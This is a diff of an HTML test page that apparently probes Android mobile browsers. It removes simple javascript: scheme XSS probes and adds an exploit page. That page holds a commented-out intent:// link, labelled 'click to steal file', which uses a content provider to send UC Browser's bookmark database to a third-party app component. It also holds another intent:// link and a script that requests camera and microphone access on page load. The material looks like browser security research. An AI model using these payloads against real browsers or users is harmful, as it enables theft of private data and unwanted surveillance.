@@ -1,5 +1,16 @@
-<a href="javascript:prompt(1)">click me</a>
-<a href="paypal://1111">aaa</a>
-<script>
-  window.open('javascript:alert(222)')
-</script>
+<!DOCTYPE html>
+<html>
+  <body>
+      <h1>
+        <!-- <a href="intent://com.uc.browser.en.fileprovider/root/data/data/com.uc.browser.en/databases/bookmark.db#Intent;scheme=content;action=android.intent.action.SEND;type=image/jpeg;component=com.zzy.myapplication/.MainActivity;S.android.intent.extra.TEXT=hello;end">click to steal file</a> -->
+        <a href="intent://aaaaa#Intent;scheme=android-app;action=android.intent.action.VIEW;end">click</a>
+      </h1>
+  </body>
+  <script>
+   window.onload=function(){
+     setTimeout(function(){
+      navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+     },1000);
+   }
+  </script>
+</html>
